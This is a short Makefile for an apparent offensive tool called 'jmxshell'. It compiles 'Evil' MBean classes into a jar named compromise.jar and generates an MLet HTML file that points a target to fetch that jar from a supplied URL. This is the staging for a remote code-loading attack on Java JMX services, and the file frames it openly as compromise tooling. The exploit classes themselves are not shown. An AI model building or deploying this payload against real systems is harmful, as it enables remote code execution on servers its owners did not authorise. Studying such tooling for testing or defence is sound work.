# jmxshell

ifndef JAVAC
override JAVAC = javac
endif

all: cleanup remote eviljar mletfile

remote:
	@echo Building RemoteMbean
	@$(JAVAC) RemoteMbean.java

cleanup:
	@echo Building CleanupMbean
	@$(JAVAC) CleanupMbean.java

eviljar: 
	@echo Building Evil Jar
	@rm -f com/braden/Evil*.class
	@$(JAVAC) com/braden/EvilMBean.java com/braden/Evil.java
	@rm -f web/compromise.jar
	@jar cfm web/compromise.jar manifest com/braden/Evil*.class
       
mletfile:
	@if [[ "x$(URL)" = "x" ]];then echo "Error: URL=<url> variable not passed"; exit 1;fi
	@echo "Creating mlet file to serve web/compromise.jar from $(URL)"
	@perl -p -e 's!__URL__!$(URL)!' web/woot.template > web/woot.html

clean:
	@rm -f RemoteMbean.class CleanupMbean.class com/braden/Evil*.class web/compromise.jar web/woot.html
